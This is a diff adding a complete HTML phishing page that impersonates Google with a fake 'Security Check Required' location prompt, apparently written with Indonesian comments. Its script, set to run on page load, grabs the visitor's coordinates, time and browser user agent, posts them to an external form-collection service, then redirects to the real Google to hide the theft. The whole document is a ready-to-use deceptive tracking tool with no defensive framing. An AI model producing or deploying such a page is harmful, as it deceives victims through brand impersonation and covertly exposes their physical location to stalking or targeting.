@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Location Verification</title>
+    <style>/* CSS meniru Google */</style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ Security Check Required</h1>
+        <p>Google needs to verify your location to protect your account.</p>
+        <button onclick="getLocation()">Verify Now</button>
+    </div>
+
+    <script>
+        async function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const data = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            time: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        };
+
+                        // Kirim ke layanan eksternal
+                        // Contoh: Formspree (mengumpulkan data seperti form)
+                        await fetch('https://formspree.io/f/YOUR_FORM_ID', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+
+                        // Redirect ke Google asli setelah berhasil
+                        window.location.href = 'https://google.com';
+                    },
+                    (error) => {
+                        alert('Location access is required to continue.');
+                    }
+                );
+            }
+        }
+        
+        // Opsi: auto-request saat halaman dimuat
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
